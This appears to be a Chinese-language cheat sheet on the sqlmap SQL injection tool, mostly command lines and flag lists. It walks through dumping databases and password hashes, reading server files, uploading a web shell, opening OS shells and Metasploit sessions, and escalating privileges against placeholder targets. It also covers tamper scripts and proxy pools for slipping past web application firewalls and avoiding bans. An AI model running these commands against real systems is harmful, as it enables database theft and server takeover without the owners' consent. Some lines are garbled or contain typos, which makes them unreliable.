<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;⽹址&quot; --dbs</span><br></pre></td></tr></table></figure>

<p>注出指定数据库下的所有表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;⽹址&quot; -D 数据库名 --tables</span><br></pre></td></tr></table></figure>

<p>注出指定数据库指定表下所有列信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;⽹址&quot; -D 数据库名 -T 表名 --columns</span><br></pre></td></tr></table></figure>

<p>注出所有指定列数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;⽹址&quot; -D 数据库名 -T 表名 -C 列名 --dump</span><br></pre></td></tr></table></figure>

<p>在任意环节使用–dumps，可以将所有数据注出，如指定数据库使用，注出所有数据库下的所有表的所有字段信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 .\sqlmap.py -u &quot;http://127.0.0.1:8888/Less-2/?id=1&quot; -D test --dump</span><br></pre></td></tr></table></figure>

<p>–batch命令可以自动跳过选择项，按默认选项注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py  -r &quot;D:\dataPack.txt&quot;  --proxy &quot;http://127.0.0.1:8080&quot; --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&quot;   --batch </span><br></pre></td></tr></table></figure>



<h2 id="进阶命令"><a href="#进阶命令" class="headerlink" title="进阶命令"></a>进阶命令</h2><p>1.输出信息的详细程度</p>
<p>-v  #共7个级别(0~6)，默认为1<br>#可以用 -vv 代替 -v 2，推荐使用这种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0：只输出 Python 出错回溯信息，错误和关键信息</span><br><span class="line">1：增加输出普通信息和警告信息</span><br><span class="line">2：增加输出调试信息</span><br><span class="line">3：增加输出已注入的 payloads</span><br><span class="line">4：增加输出 HTTP 请求</span><br><span class="line">5：增加输出 HTTP 响应头</span><br><span class="line">6：增加输出 HTTP 响应内容</span><br></pre></td></tr></table></figure>



<p>2.连接信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--method=METHOD   			*			#强制使用提供的 HTTP 方法（例如：PUT）</span><br><span class="line">--data=DATA     			*			#使用 POST 发送数据串；--data=&quot;id=1&amp;user=admin&quot;</span><br><span class="line">--param-del=&quot;;&quot;   						#使用参数分隔符，--data=&quot;id=1;user=admin&quot;</span><br><span class="line">--cookie=COOKIE      		*			#指定 HTTP Cookie ，--cookie &quot;id=11&quot; --level 2</span><br><span class="line">--drop-set-cookie    					#忽略 HTTP 响应中的 Set-Cookie 参数</span><br><span class="line">--user-agent=AGENT     		*			#指定 HTTP User-Agent</span><br><span class="line">--random-agent       		*			#使用随机的 HTTP User-Agent，随机从 ./txt/user-agents.txt 选一个，不是每次请求换一个</span><br><span class="line">--host           						#手动设置 HTTP Host 请求头值，默认情况下，HTTP Host 请求头从提供的目标 URL 中解析</span><br><span class="line">--referer=REFERER    		*			#指定 HTTP Referer，默认情况下不会在 HTTP 请求中发送 HTTP Referer 请求头</span><br><span class="line">-H HEADER        						#设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;）</span><br><span class="line">--headers=HEADERS    					#设置额外的 HTTP 头参数,必须以换行符分隔（例如：&quot;Accept-Language: fr\nETag: 123&quot;）</span><br><span class="line">--ignore-code   						#忽略（有问题的）HTTP 错误码</span><br><span class="line">--proxy						*			#代理</span><br><span class="line">--delay=10      			*			#设置每个 HTTP 请求的延迟秒数（防封）</span><br><span class="line">--safe-freq=SAFE   						#每访问两次给定的合法 URL 才发送一次测试请求</span><br><span class="line">--csrf-token 和 --csrf-url 				#绕过反 CSRF 防护</span><br><span class="line">-force-ssl      						#支持https的SQL注入只需加入参数-force-ssl告诉sqlmap这是http服务即可</span><br><span class="line">--eval        							#在每个请求期间运行自定义的 Python 代码</span><br></pre></td></tr></table></figure>



<p>3.注入参数操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p TESTPARAMETER  						#指定需要测试的参数</span><br><span class="line">--skip=SKIP  							#指定要跳过的参数</span><br><span class="line">--dbms=DBMS   							#指定 DBMS 类型（例如：MySQL）</span><br><span class="line">--os=OS   							    #指定 DBMS 服务器的操作系统类型</span><br><span class="line">--prefix=PREFIX   			*			#注入 payload 的前缀字符串	 </span><br><span class="line">--suffix=SUFFIX    			*			#注入 payload 的后缀字符串		</span><br><span class="line">--tamper=TAMPER    			*			#用给定脚本修改注入数据</span><br><span class="line">--batch        				*			# 自动跳过选择项，按默认选项注入</span><br></pre></td></tr></table></figure>



<p>4.指定检测级别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–level 1 检测Get和Post</span><br><span class="line"></span><br><span class="line">–level 2 检测HTTP Cookie</span><br><span class="line"></span><br><span class="line">–level 3 检测User-Agent和Referer</span><br><span class="line"></span><br><span class="line">–level 4 检测</span><br><span class="line"></span><br><span class="line">–level 5 检测 HOST 头</span><br><span class="line">------------------------------------</span><br><span class="line"></span><br><span class="line">–risk 2 会在默认的检测上添加大量时间型盲注语句测试</span><br><span class="line"></span><br><span class="line">–risk 3 会在原基础上添加 OR 类型的布尔型盲注 ，可能会update导致修改数据库</span><br></pre></td></tr></table></figure>



<p>5.信息获取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a, --all          				#获取所有信息、数据</span><br><span class="line">-f, --fingerprint 				#采用特定 SQL 方言或者内带特定错误信息等技术展开详细的 DBMS 指纹识别</span><br><span class="line">-b, --banner        			#获取 DBMS banner,返回数据库的版本号</span><br><span class="line">--current-user     				#获取 DBMS 当前用户</span><br><span class="line">--current-db                    #获取 DBMS 当前数据库</span><br><span class="line">--hostname                      #获取 DBMS 服务器的主机名</span><br><span class="line">--is-dba                *       #探测 DBMS 当前用户是否为 DBA（数据库管理员）</span><br><span class="line">--users                         #枚举出 DBMS 所有用户</span><br><span class="line">--passwords                     #枚举出 DBMS 所有用户的密码哈希</span><br><span class="line">--privileges            *       #枚举出 DBMS 所有用户特权级</span><br><span class="line">--roles                         #枚举出 DBMS 所有用户角色</span><br><span class="line"></span><br><span class="line">--dbs         			*		#枚举出 DBMS 所有数据库</span><br><span class="line">--tables      			*		#枚举出 DBMS 数据库中的所有表</span><br><span class="line">--columns     			*		#枚举出 DBMS 表中的所有列</span><br><span class="line">--schema      			*		#枚举出 DBMS 所有模式</span><br><span class="line">--count       					#获取数据表数目</span><br><span class="line">--dump-all    			*		#如果当前会话用户的读取权限允许，可以一次导出所有数据库表条目</span><br><span class="line">--dump        			*		#导出 DBMS 数据库表项</span><br><span class="line">--search，-C，-T，-D   	      #此开关允许你在所有数据库中搜索特定的数据库名和表名，在特定的数据表中搜索特定的列名</span><br><span class="line">--stop 10       		*		#只取前10行数据</span><br><span class="line">    </span><br><span class="line">-D DB         			*		#指定要枚举的 DBMS 数据库</span><br><span class="line">-T TBL          		*		#指定要枚举的 DBMS 数据表</span><br><span class="line">-C COL          		*		#指定要枚举的 DBMS 数据列</span><br><span class="line">    </span><br><span class="line">--sql-query=QUERY   	*		#指定要执行的 SQL 语句</span><br><span class="line">--sql-shell       				#调出交互式 SQL shell</span><br></pre></td></tr></table></figure>



<p>应用场景</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">伪静态注入</span><br><span class="line">sqpmap  -u http://victim.com/id/666*.html --dbs  #在html扩展名前加个&#x27;*&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">文件操作</span><br><span class="line">sqlmap -u url --is-dba														#查看是否dba权限,必须为root权限</span><br><span class="line">sqlmap -u url --file-read &quot;C:/Windows/win.ini&quot;   							#读取文件</span><br><span class="line"></span><br><span class="line">sqlmap -u url --file-write=D:/shell.php --file-dest=C:/www/shell.php		#上传文件 (本地木马路径:目标网站目录)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">执行命令（原理/条件）（管理员、secure_file_priv、GPC）</span><br><span class="line">sqlmap -u &quot;URL&quot; --os-shell  #获取系统交互shell或--os-cmd=id执行系统命令</span><br><span class="line">		获取shell  	交互式命令</span><br><span class="line">		（上传）一个小马（网页--上传任意文件）--是否存在</span><br><span class="line">		大马（os-shell--&gt;执行计算机命令）</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">访问 Windows 注册表</span><br><span class="line">--reg-read    #读取 Windows 注册表键值</span><br><span class="line">--reg-add   #写入 Windows 注册表键值</span><br><span class="line">--reg-del   #删除 Windows 注册表项</span><br><span class="line">--reg-key，--reg-value，--reg-data 和 --reg-type #注册表辅助选项</span><br><span class="line"></span><br><span class="line">常规选项</span><br><span class="line">-s      #从已存储（.sqlite）文件读取会话</span><br><span class="line">#qlmap 会在专用的输出目录中自动为每一个目标分别建立持久会话 SQLite 文件，该文件会存储用于恢复会话的所有数据。如果用户需要指定会话文件的具体存储位置（例如：将所有目标的会话数据存储在同一个位置），则可以使用这个选项</span><br><span class="line">-t      #记录 HTTP(s) 访问信息到文本文件,这个选项需要一个指定文本文件地址的参数，用于写入 sqlmap 产生的所有 HTTP(s) 流量信息——包括 HTTP(S) 请求 和 HTTP(S) 响应</span><br><span class="line">--batch   #以非交互式模式运行,当 sqlmap 需要用户输入信息时，都将会以默认参数运行</span><br><span class="line">--update  #更新 sqlmap</span><br><span class="line">--flush-session #清空会话文件</span><br><span class="line">更多选项：</span><br><span class="line">https://sqlmap.campfire.ga/usage/general</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="tamper用法"><a href="#tamper用法" class="headerlink" title="tamper用法"></a>tamper用法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apostrophemask.py</span><br><span class="line">功能：对引号进行 utf-8 格式编码 (% EF% BC%87)</span><br><span class="line">平台：All</span><br><span class="line">举例：1 AND ‘1’=’1 ==&gt; 1 AND % EF% BC%871% EF% BC%87=% EF% BC%871</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py</span><br><span class="line">功能：用非法的双 unicode 字符 (%00%27) 替换引号字符</span><br><span class="line">平台：All</span><br><span class="line">举例：1 AND ‘1’=’1 ==&gt; 1 AND %00%271%00%27=%00%271</span><br><span class="line"></span><br><span class="line">appendnullbyte.py</span><br><span class="line">功能：在有效载荷结束位置加载零字节字符编码</span><br><span class="line">平台：Microsoft Access</span><br><span class="line">举例：1 AND 1=1 ==&gt; 1 AND 1=1%00</span><br><span class="line"></span><br><span class="line">base64encode.py</span><br><span class="line">功能：用 base64 格式进行编码</span><br><span class="line">平台：All</span><br><span class="line">举例：1’ AND SLEEP (5)# ==&gt; MScgQU5EIFNMRUVQKDUpIw==</span><br><span class="line"></span><br><span class="line">between.py</span><br><span class="line">功能：用 between 替换大于号（&gt;）</span><br><span class="line">平台：Mssql2005、MySQL 4/5.0/5.5、Oracle 10g、PostgreSQL 8.3/8.4/9.0</span><br><span class="line">举例：</span><br><span class="line">1 AND A &gt; B –  ==&gt; 1 AND A NOT BETWEEN 0 AND B  –</span><br><span class="line">1 AND A = B –  ==&gt; 1 AND A BETWEEN B AND B –</span><br><span class="line"></span><br><span class="line">bluecoat.py</span><br><span class="line">功能：对 SQL 语句替换空格字符为 (%09)，并替换”=”—&gt;”LIKE”</span><br><span class="line">平台：MySQL 5.1, SGOS</span><br><span class="line">举例：SELECT username FROM users WHERE id = 1 ==&gt; SELECT%09username FROM%09users WHERE%09id LIKE 1</span><br><span class="line"></span><br><span class="line">apostrophemask.py</span><br><span class="line">功能：用 utf-8 格式编码引号 (如：% EF% BC%87)</span><br><span class="line">平台：All</span><br><span class="line">举例：1 AND ‘1’=’1 ==&gt; 1 AND % EF% BC%871% EF% BC%87=% EF% BC%871</span><br><span class="line"></span><br><span class="line">charunicodeencode.py</span><br><span class="line">功能：对字符串进行 Unicode 格式转义编码</span><br><span class="line">平台：Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET</span><br><span class="line">举例：SELECT FIELD%20FROM TABLE ==&gt; % u0053% u0045% u004C% u0045% u0043% u0054% u0020% u0046% u0049% u0045% u004C% u0044% u0020% u0046% u0052% u004F% u004D% u0020% u0054% u0041% u0042% u004C% u0045</span><br><span class="line"></span><br><span class="line">charencode.py</span><br><span class="line">功能：采用 url 格式编码 1 次</span><br><span class="line">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">举例：SELECT FIELD FROM%20TABLE ==&gt; %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</span><br><span class="line"></span><br><span class="line">chardoubleencode.py</span><br><span class="line">功能：采用 url 格式编码 2 次</span><br><span class="line">平台：All</span><br><span class="line">举例：SELECT FIELD FROM%20TABLE ==&gt; %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</span><br><span class="line"></span><br><span class="line">commalessmid.py</span><br><span class="line">功能：将 payload 中的逗号用 from 和 for 代替，用于过滤了逗号并且是 3 个参数的情况</span><br><span class="line">平台：MySQL 5.0, 5.5</span><br><span class="line">举例：MID (VERSION (), 1, 1) ==&gt; MID (VERSION () FROM 1 FOR 1)</span><br><span class="line"></span><br><span class="line">concat2concatws.py</span><br><span class="line">功能：CONCAT () ==&gt; CONCAT_WS ()，用于过滤了 CONCAT () 函数的情况</span><br><span class="line">平台： MySQL 5.0</span><br><span class="line">举例：CONCAT (1,2) ==&gt; CONCAT_WS (MID (CHAR (0),0,0),1,2)</span><br><span class="line"></span><br><span class="line">equaltolike.py</span><br><span class="line">功能：= ==&gt; LIKE，用于过滤了等号”=” 的情况</span><br><span class="line">平台：Mssql 2005、MySQL 4, 5.0 and 5.5</span><br><span class="line">举例：SELECT * FROM users WHERE id=1 ==&gt; SELECT * FROM users WHERE id LIKE 1</span><br><span class="line"></span><br><span class="line">greatest.py</span><br><span class="line">功能：&gt; ==&gt; GREATEST</span><br><span class="line">平台：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">举例：1 AND A &gt; B ==&gt; 1 AND GREATEST (A, B+1)=A</span><br><span class="line">a 和 b+1 比较，取两者中的最大值为 a；则 a &gt;= b+1，亦即 a &gt; b</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py</span><br><span class="line">功能：空格 ==&gt; / !0 （在关键字前添加注释）</span><br><span class="line">平台：MySQL 4.0.18, 5.0.22（Mysql &lt; 5.1）</span><br><span class="line">举例：union ==&gt; /!0union</span><br><span class="line"></span><br><span class="line">ifnull2ifisnull.py</span><br><span class="line">功能：IFNULL (A, B) ==&gt; IF (ISNULL (A), B, A)</span><br><span class="line">平台：MySQL 5.0 and 5.5</span><br><span class="line">举例：IFNULL (1, 2) ==&gt; IF (ISNULL (1),2,1)</span><br><span class="line"></span><br><span class="line">informationschemacomment.py</span><br><span class="line">功能：</span><br><span class="line">在 information_schema 后面加上 // ，用于绕过对 information_schema 的情况</span><br><span class="line">retVal = re.sub(r”(?i)(information_schema).”, “g&lt;1&gt;/ /.”, payload)</span><br><span class="line">平台：All</span><br><span class="line">举例：select table_name from information_schema.tables ==&gt; select table_name from information_schema/**/.tables</span><br><span class="line"></span><br><span class="line">lowercase.py</span><br><span class="line">功能：将 payload 里的大写转为小写</span><br><span class="line">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">举例：SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; select table_name from information_schema.tables</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py</span><br><span class="line">功能：用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</span><br><span class="line">平台：MySQL 5.0</span><br><span class="line">举例：1 AND 2&gt;1–  ==&gt; 1 /!30874AND 2&gt;1/–</span><br><span class="line"></span><br><span class="line">modsecurityzeroversioned.py</span><br><span class="line">功能：用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</span><br><span class="line">平台：Mysql</span><br><span class="line">举例：1 and 2&gt;1–+ ==&gt; 1 /!00000and 2&gt;1/–+</span><br><span class="line"></span><br><span class="line">multiplespaces.py</span><br><span class="line">功能：围绕 SQL 关键字添加多个空格</span><br><span class="line">平台：All</span><br><span class="line">举例：1 UNION SELECT foobar ==&gt; 1   UNION   SELECT   foobar</span><br><span class="line"></span><br><span class="line">nonrecursivereplacement.py</span><br><span class="line">功能：关键字双写，可用于关键字过滤</span><br><span class="line">平台：All</span><br><span class="line">举例：1 UNION SELECT 2–  ==&gt; 1 UNIONUNION SELESELECTCT 2–</span><br><span class="line"></span><br><span class="line">overlongutf8.py</span><br><span class="line">功能： 转换给定的 payload 当中的所有字符</span><br><span class="line">平台：All</span><br><span class="line">举例：SELECT FIELD FROM TABLE WHERE 2&gt;1 ==&gt; SELECT% C0% AAFIELD% C0% AAFROM% C0% AATABLE% C0% AAWHERE% C0% AA2% C0% BE1</span><br><span class="line"></span><br><span class="line">percentage.py</span><br><span class="line">功能：用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个 (%)</span><br><span class="line">平台：Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0</span><br><span class="line">举例：SELECT FIELD FROM TABLE ==&gt; % S% E% L% E% C% T % F% I% E% L% D % F% R% O% M % T% A% B% L% E</span><br><span class="line"></span><br><span class="line">randomcase.py</span><br><span class="line">功能：将 payload 随机大小写</span><br><span class="line">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">举例：INSERT ==&gt; InseRt</span><br><span class="line"></span><br><span class="line">randomcomments.py</span><br><span class="line">功能：在 payload 的关键字中间随机插入注释符 /**/ ，可用于绕过关键字过滤</span><br><span class="line">平台：Mysql</span><br><span class="line">举例：INSERT ==&gt; I / ** / N / ** / SERT</span><br><span class="line"></span><br><span class="line">securesphere.py</span><br><span class="line">功能：在 payload 后追加特殊构造的字符串</span><br><span class="line">平台：All</span><br><span class="line">举例：1 AND 1=1 ==&gt; 1 AND 1=1 and ‘0having’=’0having’</span><br><span class="line"></span><br><span class="line">space2comment.py</span><br><span class="line">功能：用注释符 // 代替空格，用于空格的绕过</span><br><span class="line">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">举例：SELECT id FROM users ==&gt; SELECT//id//FROM//users</span><br><span class="line"></span><br><span class="line">space2dash.py</span><br><span class="line">功能：用 [注释符 (–)+ 一个随机字符串 + 一个换行符] 替换控制符</span><br><span class="line">平台：MSSQL、 SQLite</span><br><span class="line">举例：union select 1,2–+ ==&gt; union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</span><br><span class="line"></span><br><span class="line">space2hash.py</span><br><span class="line">功能：用 [注释符 (#)+ 一个随机字符串 + 一个换行符] 替换控制符</span><br><span class="line">平台：Mysql</span><br><span class="line">举例：union select 1,2–+ ==&gt; union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</span><br><span class="line"></span><br><span class="line">space2morehash.py</span><br><span class="line">功能：用多个 [注释符 (#)+ 一个随机字符串 + 一个换行符] 替换控制符</span><br><span class="line">平台：MySQL &gt;= 5.1.13</span><br><span class="line">举例：union select 1,2–+ ==&gt; union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+</span><br><span class="line"></span><br><span class="line">space2mssqlblank.py</span><br><span class="line">功能：用随机的空白符替换 payload 中的空格</span><br><span class="line">blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</span><br><span class="line">平台：Mssql 2000,2005</span><br><span class="line">举例：SELECT id FROM users ==&gt; SELECT%0Eid%0DFROM%07users</span><br><span class="line"></span><br><span class="line">space2mssqlhash.py</span><br><span class="line">功能：用 [字符# + 一个换行符] 替换 payload 中的空格</span><br><span class="line">平台：MSSQL、MySQL</span><br><span class="line">举例：union select 1,2–+ ==&gt; union%23%0Aselect%23%0A1,2–+</span><br><span class="line"></span><br><span class="line">space2plus.py</span><br><span class="line">功能：用加号 (+) 替换空格</span><br><span class="line">平台：All</span><br><span class="line">举例：SELECT id FROM users ==&gt; SELECT+id+FROM+users</span><br><span class="line"></span><br><span class="line">space2randomblank.py</span><br><span class="line">功能：用随机的空白符替换 payload 中的空格</span><br><span class="line">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">举例：SELECT id FROM users ==&gt; SELECT%0Did%0DFROM%0Ausers</span><br><span class="line"></span><br><span class="line">sp_password.py</span><br><span class="line">功能：在 payload 语句后添加 sp_password ，用于迷惑数据库日志（Space ==&gt; sp_password）</span><br><span class="line">平台：Mssql</span><br><span class="line">举例：1 AND 9227=9227–  ==&gt; 1 AND 9227=9227 – sp_password</span><br><span class="line"></span><br><span class="line">symboliclogical.py</span><br><span class="line">功能：用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</span><br><span class="line">平台：All</span><br><span class="line">举例：</span><br><span class="line">1 and 1=1 ==&gt; 1 %26%26 1=1</span><br><span class="line">1 or 1=1 ==&gt; 1 %7c%7c 1=1</span><br><span class="line"></span><br><span class="line">unionalltounion.py</span><br><span class="line">功能：用 union select 替换 union all select</span><br><span class="line">平台：All</span><br><span class="line">举例：union all select 1,2–+ ==&gt; union select 1,2–+</span><br><span class="line"></span><br><span class="line">unmagicquotes.py</span><br><span class="line">功能：用宽字符绕过 GPC addslashes</span><br><span class="line">平台：All</span><br><span class="line">举例：1’ and 1=1 ==&gt; 1% df%27 and 1=1–</span><br><span class="line"></span><br><span class="line">uppercase.py</span><br><span class="line">功能：将 payload 中的小写字母转为大写格式</span><br><span class="line">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">举例：insert ==&gt; INSERT</span><br><span class="line"></span><br><span class="line">varnish.py</span><br><span class="line">功能：添加一个 HTTP 头 “X-originating-IP” 来绕过 WAF</span><br><span class="line">平台：headers = kwargs.get (“headers”, &#123;&#125;) headers [“X-originating-IP”] = “127.0.0.1”return payload</span><br><span class="line">举例：All</span><br><span class="line"></span><br><span class="line">versionedkeywords.py</span><br><span class="line">功能：对非函数的关键字进行注释</span><br><span class="line">平台：MySQL 4.0.18, 5.1.56, 5.5.11</span><br><span class="line">举例：1 union select user () ==&gt; 1/!UNION//!SELECT/user ()</span><br><span class="line"></span><br><span class="line">versionedmorekeywords.py</span><br><span class="line">功能：对每个关键字进行注释处理</span><br><span class="line">平台：MySQL 5.1.56, 5.5.11</span><br><span class="line">举例：1 union select user () ==&gt; 1/!UNION//!SELECT/user ()</span><br><span class="line"></span><br><span class="line">xforwardedfor.py</span><br><span class="line">功能：添加一个伪造的 HTTP 头 “X-Forwarded-For” 来绕过 WAF</span><br><span class="line">平台：All</span><br><span class="line">举例：headers = kwargs.get (“headers”, &#123;&#125;) headers [“X-Forwarded-For”] = randomIP () return payload</span><br></pre></td></tr></table></figure>









<h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句 :"></a>常用语句 :</h2><p>waf绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">延时，ua头修改，代理池,自带脚本tamper</span><br><span class="line"></span><br><span class="line">执行脚本</span><br><span class="line">/sqlmap.py -u &quot;http://192.168.1.1/4.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span><br><span class="line"></span><br><span class="line">添加延时（不能）  		</span><br><span class="line">	--delay 2</span><br><span class="line">	</span><br><span class="line">ip代理池</span><br></pre></td></tr></table></figure>

<h2 id="代理池技术"><a href="#代理池技术" class="headerlink" title="代理池技术"></a>代理池技术</h2><p>proxyPool.py（端口5010）</p>
<p>py -3.6 -m pip install -r requirements.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxyPool.py</span><br><span class="line">1.py -3.6 -m pip install -r requirements.txt //安装环境</span><br><span class="line"></span><br><span class="line">2.开启redis(配置setting redis密码（默认要设置为空）)</span><br><span class="line"></span><br><span class="line">3.py -3.6 proxyPool.py schedule		//爬取免费并且有效的代理IP</span><br><span class="line"></span><br><span class="line">4.py -3.6 proxyPool.py server		//启动api服务</span><br><span class="line"></span><br><span class="line">5.py -3.6 main.py					//爬取代理池中所有可用IP，并且保存到文件ips.txt</span><br><span class="line">----------------运行到这上面所有可关----------------------</span><br><span class="line"></span><br><span class="line">6.go.py  go2.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<p>![image-20230405105023932](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20230405105023932.png)</p>
<p>![image-20230405105317613](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20230405105317613.png)</p>
<p>![image-20230405110141961](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20230405110141961.png)</p>
<p>![image-20230405110308162](D:\Documents\WeChat Files\wxid_ysgqrgnqemdo22\FileStorage\File\2023-04\0405md\0405.assets\image-20230405110308162.png)</p>
<p>1.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -f -b –current-user –current-db –users –passwords –dbs -v 0    </p>
<p>2.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –passwords -U root –union-use -v 2 </p>
<p>3.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –dump -T users -C username -D userdb –start 2 –stop 3 -v 2 </p>
<p>4.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –dump -C “user,pass”  -v 1 –exclude-sysdbs </p>
<p>5.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –sql-shell -v 2 </p>
<p>6.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –file-read “c:\boot.ini” -v 2 </p>
<p>7.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt -v 2 </p>
<p>8.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-cmd “id” -v 1 </p>
<p>9.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-shell –union-use -v 2 </p>
<p>10.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 –priv-esc -v 1 </p>
<p>11.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 -v 1 </p>
<p>12.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-bof –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 -v 1 </p>
<p>13.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –reg-add –reg-key&#x3D;”HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap” –reg-value&#x3D;Test –reg-type&#x3D;REG_SZ –reg-data&#x3D;1 </p>
<p>14.&#x2F;sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –eta </p>
<p>15.&#x2F;sqlmap.py -u “<a href="http://192.168.1.1/4.php?id=1">http://192.168.1.1/4.php?id=1</a>“ -p id –prefix “‘)” –suffix “AND (‘abc’&#x3D;’abc”</p>
<p>16.&#x2F;sqlmap.py -u “<a href="http://192.168.1.1/4.php?id=1">http://192.168.1.1/4.php?id=1</a>“ –auth-type Basic –auth-cred “testuser:testpass”</p>
<p>17.&#x2F;sqlmap.py -l burp.log –scope&#x3D;”(www)?.target.(com|net|org)”</p>
<p>18.&#x2F;sqlmap.py -u “<a href="http://192.168.1.1/4.php?id=1">http://192.168.1.1/4.php?id=1</a>“ –tamper tamper&#x2F;between.py,tamper&#x2F;randomcase.py,tamper&#x2F;space2comment.py -v 3 </p>
<p>19.&#x2F;sqlmap.py -u “<a href="http://192.168.1.1/4.php?id=1">http://192.168.1.1/4.php?id=1</a>“ –sql-query “SELECT  123” -v 1 </p>
